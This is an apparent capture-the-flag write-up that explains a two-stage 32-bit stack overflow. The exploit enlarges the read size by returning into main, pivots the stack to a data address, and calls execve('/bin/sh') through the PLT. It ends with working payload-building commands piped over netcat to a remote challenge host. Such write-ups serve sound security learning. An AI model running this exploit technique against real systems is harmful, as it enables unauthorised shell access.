
# Explanation


# This program read 30 bytes of your input and save to a local buffer. The offset of saved eip is after 20 bytes.
# it sucks when you see a plt@execve but u don't have enough size of read to correctly form the Buffer Overflow .
# Well no worries at least we can modify the saved eip.
#
# First we want to modify the size of read so that we can write as how many byte as we want !
# but how can we do it?
# Just jump to
#
#   0x8048441 <main+6>:	push   0x1e
#=> 0x8048443 <main+8>:	lea    eax,[ebp-0x10]
#   0x8048446 <main+11>:	push   eax
#   0x8048447 <main+12>:	push   0x0
#
# we know that theres a push 0x1e which is the size so we will already have a custom size which is on the stack
# [address of main+8][NEW SIZE OF READ]
# when the instruction get to address of main+8 the esp will be pointing to NEW SIZE OF READ
# which means when a value is push it wont overwrite
#
# lea    eax,[ebp-0x10]
#
# we need to be aware that when we overflowed the saved eip we modifed the saved ebp
# so we need to craft it carefully so that read won't write to an invalid address
#
# LOAD           0x000000 0x08048000 0x08048000 0x00638 0x00638 R E 0x1000
# LOAD           0x000f08 0x08049f08 0x08049f08 0x00118 0x0011c RW  0x1000
#
# 0x0804a200 seems fine because it's inside the 2nd LOAD(DATA) SEGMENT and its on the padding so it won't overwrite any
# value.
#
# our NEW SIZE OF READ will be a value which is enough to craft our exploit so I choose 0x29
# So the first payload is :
# [JUNK][WRITABLE ADDRESS][JMP TO instruction lea eax, [ebp-0x10]][NEW SIZE OF READ][JUNK to fill he size of read]
# [A*16][0x0804a200][0x08048443][0x00000029][\x00][\x0a] <- no need for \x10 because python print automaticaly add a newline
#
# Now we need to craft our new Buffer OverFlow
#
# We can see that there is a plt@execve so we will use this.
# Our second payload will be:
# [JUNK][plt@execve][JUNK][addr of string "/bin/sh"][NULL][NULL]
# [A*20][0x08048320][JUNK][0x08040500][0x00000000][0x00000000]
#
# and that's it !
#
# Wait...... but we write our payload to data segment and not to stack so how can there be a bufferoverflow?
# let's think a bit what does the instruction leave do?
# It mov esp, ebp and then pop ebp
# which means that
# ebp = 0x0804a200
# esp = ebp
# esp += 4 (because of pop ebp)
#
# let's check it with gdb. We settle a breakpoint before the ret instruction after our first payload
#
# 0000| 0x804a204 --> 0x8048320 (<execve@plt>:	jmp    DWORD PTR ds:0x804a014)
# 0004| 0x804a208 ("JUNK")
# 0008| 0x804a20c --> 0x8048500 ("/bin/sh")
# 0012| 0x804a210 --> 0x0
# 0016| 0x804a214 --> 0x0
#
# Perfect now when the ret instruction get executed the eip will be executing execve("/bin/sh", NULL, NULL);
#


python -c 'print("A"*16+"\x08\x04\xa2\x00"[::-1]+"\x08\x04\x84\x43"[::-1]+"\x29\x00\x00\x00" + "\x00")' > /tmp/exploit
python -c 'print("A"*20+"\x08\x04\x83\x20"[::-1]+"JUNK"+"\x08\x04\x85\x00"[::-1]+ "\x00\x00\x00\x00"*2)' >> /tmp/exploit
cat /tmp/exploit - | nc 3.16.169.157 12345 -vvv
